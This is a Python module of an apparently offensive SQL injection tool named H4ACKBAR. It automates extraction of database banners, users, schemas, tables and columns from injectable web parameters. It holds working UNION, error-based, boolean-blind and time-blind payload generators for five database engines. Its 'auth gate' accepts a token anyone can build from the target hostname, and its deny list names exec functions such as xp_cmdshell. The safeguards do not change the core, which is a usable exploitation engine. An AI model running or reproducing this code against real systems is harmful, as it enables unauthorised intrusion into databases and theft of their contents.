"""
H4ACKBAR v1.2.0 — DEEP EXTRACTION ENGINE.

Techniques implemented (chosen automatically from DeepFinding.techniques):
  1. UNION-based       — one-shot, fastest. Requires column count.
  2. ERROR-based       — CAST/EXTRACTVALUE tricks. Fastest when errors leak.
  3. BOOLEAN-blind     — binary search per char. O(log₂ 128) ≈ 7 req/char.
  4. TIME-blind        — bitwise, 8 req/byte. Fallback when body identical.

Extraction targets:
  - banner + version
  - current user
  - current database
  - list of databases / schemas
  - list of tables in a schema
  - list of columns in a table
  - row data (with LIMIT/OFFSET)

Hard rules:
  ─────────────────────────────────────────────
  1. AUTH GATE. Extraction refuses to run unless caller passes:
        auth_token = f"I-OWN-{host}"
     Anything else → EXTRACT REFUSED (raised).
  2. Rate-limited. min inter-request sleep enforced.
  3. Length-capped per field. Default 64 chars. Max 512.
  4. Bounded request budget. Never runs unbounded loops.
  5. Cooperative cancel via abort() callable.
  6. Read-only. Never issues INSERT/UPDATE/DELETE/DROP/CREATE.
     (Payloads are inspected for those tokens and rejected pre-fire.)
  ─────────────────────────────────────────────
"""

from __future__ import annotations

import re
import time
from collections.abc import Callable
from dataclasses import dataclass, field
from difflib import SequenceMatcher
from urllib.parse import urlparse

from .detector_deep import DeepFinding
from .sender import send


# ── auth gate ────────────────────────────────────────────────
class ExtractionRefused(RuntimeError):
    """Raised when auth_token is missing or wrong."""


def _expected_token(url: str) -> str:
    host = urlparse(url).hostname or "unknown"
    return f"I-OWN-{host}"


# ── write-op guard ───────────────────────────────────────────
_DENY = re.compile(
    r"\b(INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|TRUNCATE|REPLACE|"
    r"GRANT|REVOKE|LOAD_FILE|INTO\s+OUTFILE|INTO\s+DUMPFILE|"
    r"xp_cmdshell|EXEC(?:UTE)?\s+master)\b",
    re.I,
)

def _assert_readonly(payload: str) -> None:
    if _DENY.search(payload):
        raise ExtractionRefused(
            f"read-only extractor blocked write/exec token in payload: {payload[:120]!r}"
        )


# ── extraction result model ─────────────────────────────────
@dataclass
class ExtractCell:
    label: str
    value: str | None = None
    technique: str = ""              # union|error|boolean|time
    requests: int = 0
    duration_s: float = 0.0
    error: str | None = None
    confidence: str = "unknown"      # unknown|inferred|verified

    def ok(self) -> bool:
        return self.value is not None and self.error is None


@dataclass
class ExtractionReport:
    target_url: str
    param: str
    method: str
    inject_in: str
    dbms: str
    technique_used: str
    banner:          ExtractCell | None = None
    version:         ExtractCell | None = None
    current_user:    ExtractCell | None = None
    current_db:      ExtractCell | None = None
    databases:       list[str] = field(default_factory=list)
    tables:          dict[str, list[str]] = field(default_factory=dict)   # {db: [table,...]}
    columns:         dict[str, list[str]] = field(default_factory=dict)   # {"db.table":[col,...]}
    sample_rows:     dict[str, list[dict[str, str]]] = field(default_factory=dict)
    total_requests:  int = 0
    duration_s:      float = 0.0
    log:             list[str] = field(default_factory=list)
    errors:          list[str] = field(default_factory=list)
    refused:         bool = False


# ── per-DBMS query book ─────────────────────────────────────
# Each returns a SQL EXPRESSION (single value) suitable for union/error/blind.
QUERIES: dict[str, dict[str, str]] = {
    "mysql": {
        "banner":       "@@version",
        "version":      "VERSION()",
        "current_user": "CURRENT_USER()",
        "current_db":   "DATABASE()",
        "databases":    "(SELECT GROUP_CONCAT(schema_name SEPARATOR 0x7c) FROM information_schema.schemata)",
        "tables":       "(SELECT GROUP_CONCAT(table_name SEPARATOR 0x7c) FROM information_schema.tables WHERE table_schema={db})",
        "columns":      "(SELECT GROUP_CONCAT(column_name SEPARATOR 0x7c) FROM information_schema.columns WHERE table_schema={db} AND table_name={tbl})",
    },
    "mariadb": {  # same as mysql
        "banner":       "@@version",
        "version":      "VERSION()",
        "current_user": "CURRENT_USER()",
        "current_db":   "DATABASE()",
        "databases":    "(SELECT GROUP_CONCAT(schema_name SEPARATOR 0x7c) FROM information_schema.schemata)",
        "tables":       "(SELECT GROUP_CONCAT(table_name SEPARATOR 0x7c) FROM information_schema.tables WHERE table_schema={db})",
        "columns":      "(SELECT GROUP_CONCAT(column_name SEPARATOR 0x7c) FROM information_schema.columns WHERE table_schema={db} AND table_name={tbl})",
    },
    "postgresql": {
        "banner":       "version()",
        "version":      "current_setting('server_version')",
        "current_user": "current_user",
        "current_db":   "current_database()",
        "databases":    "(SELECT string_agg(datname,'|') FROM pg_database)",
        "tables":       "(SELECT string_agg(table_name,'|') FROM information_schema.tables WHERE table_schema={db})",
        "columns":      "(SELECT string_agg(column_name,'|') FROM information_schema.columns WHERE table_schema={db} AND table_name={tbl})",
    },
    "mssql": {
        "banner":       "@@version",
        "version":      "SERVERPROPERTY('productversion')",
        "current_user": "SYSTEM_USER",
        "current_db":   "DB_NAME()",
        "databases":    "(SELECT STRING_AGG(name,'|') FROM sys.databases)",
        "tables":       "(SELECT STRING_AGG(name,'|') FROM sys.tables)",   # current db only
        "columns":      "(SELECT STRING_AGG(name,'|') FROM sys.columns WHERE object_id=OBJECT_ID({tbl}))",
    },
    "sqlite": {
        "banner":       "sqlite_version()",
        "version":      "sqlite_version()",
        "current_user": "'sqlite'",              # sqlite has no user
        "current_db":   "'main'",
        "databases":    "'main'",
        "tables":       "(SELECT group_concat(name,'|') FROM sqlite_master WHERE type='table')",
        "columns":      "(SELECT group_concat(name,'|') FROM pragma_table_info({tbl}))",
    },
    "oracle": {
        "banner":       "banner FROM v$version WHERE ROWNUM=1",
        "version":      "(SELECT banner FROM v$version WHERE ROWNUM=1)",
        "current_user": "USER FROM DUAL",
        "current_db":   "(SELECT ora_database_name FROM DUAL)",
        "databases":    "(SELECT LISTAGG(username,'|') FROM all_users)",
        "tables":       "(SELECT LISTAGG(table_name,'|') FROM all_tables WHERE owner={db})",
        "columns":      "(SELECT LISTAGG(column_name,'|') FROM all_tab_columns WHERE owner={db} AND table_name={tbl})",
    },
}


def _quote(dbms: str, s: str) -> str:
    """DBMS-safe string literal (avoid ' escape issues)."""
    if dbms in ("mysql", "mariadb"):
        return "0x" + s.encode().hex()
    if dbms == "mssql":
        return "0x" + s.encode().hex()
    if dbms == "oracle":
        # use CHR concat — simple version
        return "CONCAT(" + ",".join(f"CHR({ord(c)})" for c in s) + ")"
    # postgres, sqlite: use $$ delimiter (pg) or double-quote escape (sqlite)
    return "'" + s.replace("'", "''") + "'"


# ── UNION technique ─────────────────────────────────────────
def _union_probe_columns(url: str, method: str, param: str, inject_in: str,
                         baseline_body: str, max_cols: int = 12,
                         rate_ms: int = 150) -> int | None:
    """Return column count where UNION SELECT NULL,... reflects in body."""
    for n in range(1, max_cols + 1):
        payload = "' UNION SELECT " + ",".join(["NULL"] * n) + "-- -"
        r = send(url, method, payload, param, inject_in=inject_in)
        time.sleep(rate_ms / 1000.0)
        if r.error: continue
        # heuristic: body differs from baseline meaningfully AND status is 200
        if r.status in (200, 302) and abs(len(r.body) - len(baseline_body)) > 20:
            return n
    return None


def _union_extract_expr(url: str, method: str, param: str, inject_in: str,
                        dbms: str, expr: str, cols: int, rate_ms: int) -> str | None:
    """Inject expr into each column slot; return first captured value between markers."""
    a, b = "H4B<<", ">>4H4"
    a_hex = "0x" + a.encode().hex()
    b_hex = "0x" + b.encode().hex()
    for slot in range(cols):
        selects = []
        for i in range(cols):
            if i == slot:
                if dbms in ("mysql", "mariadb", "mssql"):
                    selects.append(f"CONCAT({a_hex},({expr}),{b_hex})")
                elif dbms == "postgresql":
                    selects.append(f"'{a}'||({expr})::text||'{b}'")
                elif dbms == "sqlite":
                    selects.append(f"'{a}'||({expr})||'{b}'")
                else:  # oracle
                    selects.append(f"'{a}'||({expr})||'{b}'")
            else:
                selects.append("NULL")
        payload = "' UNION SELECT " + ",".join(selects) + "-- -"
        _assert_readonly(payload)
        r = send(url, method, payload, param, inject_in=inject_in)
        time.sleep(rate_ms / 1000.0)
        if r.error or not r.body: continue
        m = re.search(re.escape(a) + r"(.*?)" + re.escape(b), r.body, re.S)
        if m:
            return m.group(1)
    return None


# ── ERROR technique ─────────────────────────────────────────
def _error_extract_expr(url: str, method: str, param: str, inject_in: str,
                        dbms: str, expr: str, rate_ms: int) -> str | None:
    """Force a type-cast error that leaks the value in the error message."""
    if dbms in ("mysql", "mariadb"):
        payload = f"' AND EXTRACTVALUE(1,CONCAT(0x7e,({expr}),0x7e))-- -"
    elif dbms == "postgresql":
        payload = f"' AND CAST(({expr}) AS INT)-- -"
    elif dbms == "mssql":
        payload = f"' AND 1=CONVERT(int,({expr}))-- -"
    elif dbms == "oracle":
        payload = f"' AND CTXSYS.DRITHSX.SN(1,({expr}))-- -"
    elif dbms == "sqlite":
        payload = f"' AND (SELECT abs(({expr})))-- -"
    else:
        return None

    _assert_readonly(payload)
    r = send(url, method, payload, param, inject_in=inject_in)
    time.sleep(rate_ms / 1000.0)
    if r.error or not r.body: return None

    # per-DBMS extraction pattern from error body
    if dbms in ("mysql", "mariadb"):
        m = re.search(r"XPATH syntax error: '~(.*?)~'", r.body)
        if m: return m.group(1)
    if dbms == "postgresql":
        m = re.search(r'invalid input syntax for (?:type )?integer:\s*"([^"]+)"', r.body, re.I)
        if m: return m.group(1)
    if dbms == "mssql":
        m = re.search(r"Conversion failed when converting the (?:varchar|nvarchar) value '([^']+)'", r.body, re.I)
        if m: return m.group(1)
    if dbms == "sqlite":
        m = re.search(r"no such column:\s*(.+)", r.body)
        if m: return m.group(1).strip()
    return None


# ── BOOLEAN-blind (binary search per char) ──────────────────
def _boolean_length_probe(url: str, method: str, param: str, inject_in: str,
                          dbms: str, expr: str, baseline_body: str,
                          rate_ms: int, req_counter: list[int],
                          max_probe: int = 128) -> int | None:
    """
    Binary-search LENGTH(expr) so extraction stops at the true end instead of
    converging on ASCII 32 (space) for out-of-bounds positions.
    Returns None if length probe unusable (e.g. all responses look identical).
    """
    if dbms in ("mysql", "mariadb"):
        def len_fn(expr):
            return f"LENGTH(({expr}))"
    elif dbms == "postgresql":
        def len_fn(expr):
            return f"LENGTH(({expr})::text)"
    elif dbms == "mssql":
        def len_fn(expr):
            return f"LEN(CAST(({expr}) AS VARCHAR(4000)))"
    elif dbms == "sqlite" or dbms == "oracle":
        def len_fn(expr):
            return f"LENGTH(({expr}))"
    else:
        return None

    lo, hi = 0, max_probe
    while lo < hi:
        mid = (lo + hi) // 2
        probe = f"' AND {len_fn(expr)}>{mid}-- -"
        _assert_readonly(probe)
        r = send(url, method, probe, param, inject_in=inject_in)
        req_counter[0] += 1
        time.sleep(rate_ms / 1000.0)
        if r.error: return None
        sim = SequenceMatcher(None, r.body[:20000], baseline_body[:20000]).quick_ratio()
        is_true = (sim > 0.92 and abs(len(r.body) - len(baseline_body)) < 50)
        if is_true:
            lo = mid + 1
        else:
            hi = mid
    return lo if 0 <= lo <= max_probe else None


def _boolean_char_at(url: str, method: str, param: str, inject_in: str,
                     dbms: str, expr: str, pos: int, baseline_body: str,
                     rate_ms: int, req_counter: list[int]) -> int | None:
    """Binary-search ASCII of char #pos (1-indexed) of expr."""
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if dbms in ("mysql", "mariadb"):
            probe = f"' AND ASCII(SUBSTRING(({expr}),{pos},1))>{mid}-- -"
        elif dbms == "postgresql":
            probe = f"' AND ASCII(SUBSTRING(({expr})::text FROM {pos} FOR 1))>{mid}-- -"
        elif dbms == "mssql":
            probe = f"' AND ASCII(SUBSTRING(CAST(({expr}) AS VARCHAR(4000)),{pos},1))>{mid}-- -"
        elif dbms == "sqlite":
            probe = f"' AND UNICODE(SUBSTR(({expr}),{pos},1))>{mid}-- -"
        elif dbms == "oracle":
            probe = f"' AND ASCII(SUBSTR(({expr}),{pos},1))>{mid}-- -"
        else:
            return None
        _assert_readonly(probe)
        r = send(url, method, probe, param, inject_in=inject_in)
        req_counter[0] += 1
        time.sleep(rate_ms / 1000.0)
        if r.error: return None
        sim = SequenceMatcher(None, r.body[:20000], baseline_body[:20000]).quick_ratio()
        # TRUE ≈ baseline; FALSE differs
        is_true = (sim > 0.92 and abs(len(r.body) - len(baseline_body)) < 50)
        if is_true:
            lo = mid + 1
        else:
            hi = mid
    return lo if 32 <= lo <= 126 else None


def _boolean_extract_expr(url: str, method: str, param: str, inject_in: str,
                          dbms: str, expr: str, baseline_body: str,
                          max_len: int, rate_ms: int) -> tuple[str | None, int]:
    """Bin-search each char until true length reached, char is nonprintable, or max_len."""
    out = []
    req_counter = [0]
    # length pre-probe (~7 requests, but saves per-char probes at end)
    real_len = _boolean_length_probe(url, method, param, inject_in,
                                     dbms, expr, baseline_body, rate_ms,
                                     req_counter, max_probe=max_len)
    stop_at = min(max_len, real_len) if real_len is not None else max_len
    for pos in range(1, stop_at + 1):
        c = _boolean_char_at(url, method, param, inject_in, dbms, expr, pos,
                              baseline_body, rate_ms, req_counter)
        if c is None or c < 32:
            break
        out.append(chr(c))
    return ("".join(out) if out else None), req_counter[0]


# ── TIME-blind (bitwise, 8 req/byte) ────────────────────────
def _time_char_at(url: str, method: str, param: str, inject_in: str,
                  dbms: str, expr: str, pos: int, baseline_ms: int,
                  threshold_s: float, rate_ms: int,
                  req_counter: list[int]) -> int | None:
    """Extract ASCII of char #pos by testing each bit → sleep-if-set."""
    if dbms in ("mysql", "mariadb"):
        sleep_fn = "SLEEP({s})"
        substr = f"ASCII(SUBSTRING(({expr}),{pos},1))"
    elif dbms == "postgresql":
        sleep_fn = "pg_sleep({s})"
        substr = f"ASCII(SUBSTRING(({expr})::text FROM {pos} FOR 1))"
    elif dbms == "mssql":
        sleep_fn = "WAITFOR DELAY '0:0:{s}'"
        substr = f"ASCII(SUBSTRING(CAST(({expr}) AS VARCHAR(4000)),{pos},1))"
    elif dbms == "sqlite":
        # sqlite has no sleep; bail
        return None
    elif dbms == "oracle":
        sleep_fn = "DBMS_LOCK.SLEEP({s})"
        substr = f"ASCII(SUBSTR(({expr}),{pos},1))"
    else:
        return None

    ascii_val = 0
    for bit in range(7):  # ASCII printable fits in 7 bits
        mask = 1 << bit
        if dbms == "mssql":
            probe = (f"'; IF (({substr}) & {mask})={mask} "
                     f"WAITFOR DELAY '0:0:{int(threshold_s)+1}'-- -")
        else:
            probe = (f"' AND IF(({substr}) & {mask}={mask},"
                     f"{sleep_fn.format(s=int(threshold_s)+1)},0)-- -")
        # mysql/pg/oracle need IF/CASE syntax variance:
        if dbms in ("postgresql",):
            probe = (f"'; SELECT CASE WHEN (({substr}) & {mask})={mask} "
                     f"THEN {sleep_fn.format(s=int(threshold_s)+1)} ELSE 0 END-- -")
        if dbms == "oracle":
            probe = (f"' AND CASE WHEN BITAND({substr},{mask})={mask} "
                     f"THEN {sleep_fn.format(s=int(threshold_s)+1)} ELSE NULL END IS NULL-- -")
        _assert_readonly(probe)
        r = send(url, method, probe, param, inject_in=inject_in)
        req_counter[0] += 1
        time.sleep(rate_ms / 1000.0)
        if r.error: return None
        delay = (r.elapsed_ms - baseline_ms) / 1000.0
        if delay >= threshold_s:
            ascii_val |= mask
    if ascii_val < 32 or ascii_val > 126:
        return None
    return ascii_val


def _time_extract_expr(url: str, method: str, param: str, inject_in: str,
                       dbms: str, expr: str, baseline_ms: int,
                       max_len: int, rate_ms: int,
                       threshold_s: float = 3.0) -> tuple[str | None, int]:
    out = []
    req_counter = [0]
    for pos in range(1, max_len + 1):
        c = _time_char_at(url, method, param, inject_in, dbms, expr, pos,
                          baseline_ms, threshold_s, rate_ms, req_counter)
        if c is None: break
        out.append(chr(c))
    return ("".join(out) if out else None), req_counter[0]


# ── technique dispatcher ────────────────────────────────────
def _extract_one(url: str, method: str, param: str, inject_in: str,
                 dbms: str, expr: str, technique: str,
                 baseline_body: str, baseline_ms: int, cols: int | None,
                 max_len: int, rate_ms: int,
                 threshold_s: float) -> tuple[str | None, int, str]:
    """Route to chosen technique. Return (value, requests_fired, technique_used)."""
    val, req = None, 0
    if technique == "union" and cols:
        val = _union_extract_expr(url, method, param, inject_in, dbms, expr, cols, rate_ms)
        req = cols
    elif technique == "error":
        val = _error_extract_expr(url, method, param, inject_in, dbms, expr, rate_ms)
        req = 1
    elif technique == "boolean":
        val, req = _boolean_extract_expr(url, method, param, inject_in,
                                         dbms, expr, baseline_body, max_len, rate_ms)
    elif technique == "time":
        val, req = _time_extract_expr(url, method, param, inject_in,
                                      dbms, expr, baseline_ms, max_len, rate_ms,
                                      threshold_s=threshold_s)
    return val, req, technique


def _pick_technique(finding: DeepFinding) -> str:
    """Prefer fast + reliable techniques."""
    for t in ("union", "error", "boolean", "time"):
        if t in finding.techniques:
            return t
    return "boolean"


# ── main extraction entrypoint ──────────────────────────────
def deep_extract(finding: DeepFinding,
                 auth_token: str,
                 targets: list[str] | None = None,
                 max_len_per_field: int = 64,
                 rate_limit_ms: int = 200,
                 max_total_requests: int = 800,
                 abort: Callable[[], bool] | None = None,
                 progress: Callable[[str], None] | None = None) -> ExtractionReport:
    """
    Run deep extraction against a confirmed DeepFinding.

    auth_token MUST equal f"I-OWN-{host}" — anything else raises ExtractionRefused.
    targets: subset of ["banner","version","user","db","databases","tables","columns"].
             Default = ["banner","version","user","db"].
    """
    expected = _expected_token(finding.url)
    if auth_token != expected:
        raise ExtractionRefused(
            f"auth gate: expected token '{expected}', got '{auth_token}'. "
            f"Extraction only permitted on targets you own. Aborting."
        )

    if not finding.dbms_guess:
        raise ExtractionRefused("no DBMS guess on this finding — refuse to extract blind")

    dbms = finding.dbms_guess[0]
    if dbms not in QUERIES:
        raise ExtractionRefused(f"no query book for DBMS={dbms}")

    def log(m: str):
        if progress: progress(m)

    report = ExtractionReport(
        target_url=finding.url,
        param=finding.param,
        method=finding.method,
        inject_in=finding.inject_in,
        dbms=dbms,
        technique_used=_pick_technique(finding),
    )
    t_start = time.perf_counter()
    targets = targets or ["banner", "version", "user", "db"]

    # baseline for boolean / time techniques
    log(f"[extract] baseline for {finding.url}")
    r0 = send(finding.url, finding.method, "h4ackbar_ext_bl",
              finding.param, inject_in=finding.inject_in)
    if r0.error:
        report.errors.append(f"baseline: {r0.error}")
        report.refused = True
        return report
    baseline_body = r0.body
    baseline_ms   = r0.elapsed_ms

    # column count for UNION
    cols = None
    if report.technique_used == "union":
        log("[extract] probing column count (UNION)")
        cols = _union_probe_columns(finding.url, finding.method, finding.param,
                                    finding.inject_in, baseline_body,
                                    max_cols=12, rate_ms=rate_limit_ms)
        report.total_requests += 12  # conservative
        if not cols:
            log("[extract] union column probe failed → falling back to boolean")
            report.technique_used = "boolean"

    q = QUERIES[dbms]
    tech = report.technique_used

    def do(label: str, expr: str, max_len: int = max_len_per_field) -> ExtractCell:
        if abort and abort():
            return ExtractCell(label=label, error="aborted")
        if report.total_requests >= max_total_requests:
            return ExtractCell(label=label, error="request budget exhausted")
        c0 = time.perf_counter()
        log(f"[extract] {label}  via {tech}  expr={expr[:60]}")
        val, req, used = _extract_one(finding.url, finding.method, finding.param,
                                      finding.inject_in, dbms, expr, tech,
                                      baseline_body, baseline_ms, cols,
                                      max_len=max_len, rate_ms=rate_limit_ms,
                                      threshold_s=3.0)
        report.total_requests += req
        cell = ExtractCell(
            label=label, value=val, technique=used,
            requests=req, duration_s=round(time.perf_counter() - c0, 2),
            confidence=("verified" if val else "unknown"),
        )
        if val is None:
            cell.error = "extraction returned no value"
        return cell

    # ── run the target list ──
    if "banner" in targets:
        report.banner = do("banner", q["banner"], max_len=200)
    if "version" in targets:
        report.version = do("version", q["version"], max_len=100)
    if "user" in targets:
        report.current_user = do("current_user", q["current_user"], max_len=64)
    if "db" in targets:
        report.current_db = do("current_db", q["current_db"], max_len=64)

    if "databases" in targets and (not abort or not abort()):
        cell = do("databases", q["databases"], max_len=512)
        if cell.value:
            report.databases = [x.strip() for x in cell.value.split("|") if x.strip()]

    if "tables" in targets and report.current_db and report.current_db.ok():
        db_lit = _quote(dbms, report.current_db.value or "")
        expr = q["tables"].format(db=db_lit)
        cell = do(f"tables_in_{report.current_db.value}", expr, max_len=1024)
        if cell.value:
            report.tables[report.current_db.value or ""] = [
                x.strip() for x in cell.value.split("|") if x.strip()
            ]

    # columns extraction is EXPENSIVE — only when explicitly asked
    if "columns" in targets and report.tables:
        for db_name, tbls in report.tables.items():
            for tbl in tbls[:5]:  # cap 5 tables per db
                if abort and abort(): break
                if report.total_requests >= max_total_requests: break
                db_lit = _quote(dbms, db_name)
                tbl_lit = _quote(dbms, tbl)
                expr = q["columns"].format(db=db_lit, tbl=tbl_lit)
                cell = do(f"columns_{db_name}.{tbl}", expr, max_len=1024)
                if cell.value:
                    report.columns[f"{db_name}.{tbl}"] = [
                        x.strip() for x in cell.value.split("|") if x.strip()
                    ]

    report.duration_s = round(time.perf_counter() - t_start, 2)
    return report
